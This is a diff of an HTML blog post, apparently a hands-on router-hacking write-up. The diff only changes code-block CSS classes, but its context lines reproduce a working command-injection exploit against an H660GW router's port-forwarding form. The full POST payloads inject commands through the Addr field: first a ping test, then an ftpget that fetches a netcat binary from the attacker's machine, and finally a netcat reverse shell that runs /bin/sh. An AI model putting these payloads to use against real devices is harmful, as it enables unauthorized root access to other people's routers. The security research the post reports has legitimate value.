@@ -135,7 +135,7 @@ The ssh on the server uses old algorithm so this is needed to connect over ssh:<
 <p>That post describes the basic injection but not how to get access based on it.</p>
 <p>The commands on the H660GW are very limited and gaining access through the RCE isn’t that simple.</p>
 <p>There is a busybox on the router. After gaining access running command <code>busybox</code> shows available commands:</p>
-<pre class="hljs"><code>BusyBox v1.00 (2019.11.04-10:05+0000) multi-call binary
+<pre class="hljs bg-code"><code>BusyBox v1.00 (2019.11.04-10:05+0000) multi-call binary
 
 Usage: busybox [function] [arguments]...
    or: [function] [arguments]...
@@ -170,10 +170,10 @@ I like to use some random port that nothing is using.</p>
 <p>Open Wireshark and filter requests to <code>icmp &amp;&amp; ip.addr==192.168.1.1</code></p>
 <p><img src="../images/BlogPhotos/testing-rce.png" alt="Testing RCE with Burp Suite and Wireshark"></p>
 <p>Then move the POST request found earlier to Repeater in Burp Suite and change the data from something like this:</p>
-<pre class="hljs"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
+<pre class="hljs bg-code"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
 </code></pre>
 <p>to this:</p>
-<pre class="hljs"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166;ping+-c+2+192.168.1.100&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
+<pre class="hljs bg-code"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166;ping+-c+2+192.168.1.100&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
 </code></pre>
 <p>So the injection is in Addr just:
 <code>;ping+-c+2+&lt;IP of your machine&gt;</code>
@@ -198,7 +198,7 @@ Because of that I’ve give up on sh shells completely and instead used ftp to t
 <p>So the injection is:
 <code>;ftpget+192.168.1.100+/tmp/netcat+netcat</code></p>
 <p>Thus the payload is:</p>
-<pre class="hljs"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166;ftpget+192.168.1.100+/tmp/netcat+netcat&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
+<pre class="hljs bg-code"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166;ftpget+192.168.1.100+/tmp/netcat+netcat&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
 </code></pre>
 <p>On your FTP server you should see a connection and file retrieval for the netcat. This will confirm the file transfer was successful</p>
 <p><img src="../images/BlogPhotos/transfering-netcat.png" alt="Transfering netcat to router"></p>
@@ -212,7 +212,7 @@ Because of that I’ve give up on sh shells completely and instead used ftp to t
 <p>Which encoded looks like this:</p>
 <p><code>;/tmp/netcat+192.168.1.100+1234+-e+/bin/sh+%26</code></p>
 <p>and whole payload is:</p>
-<pre class="hljs"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166;/tmp/netcat+192.168.1.100+1234+-e+/bin/sh+%26&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
+<pre class="hljs bg-code"><code>isLocalPortSupport=Yes&amp;editFlag=1&amp;delFlag=0&amp;editnum=0&amp;SelectProtocol=TCP&amp;start_port=25&amp;end_port=25&amp;Addr=192.168.1.166;/tmp/netcat+192.168.1.100+1234+-e+/bin/sh+%26&amp;local_sport=25&amp;local_eport=25&amp;ACLPort=N%2FA&amp;AccoutAclSupported=N%2FA
 </code></pre>
 <p>You should see a connection open to the netcat listener.
 <img src="../images/BlogPhotos/getting-shell.png" alt="Root shell"></p>
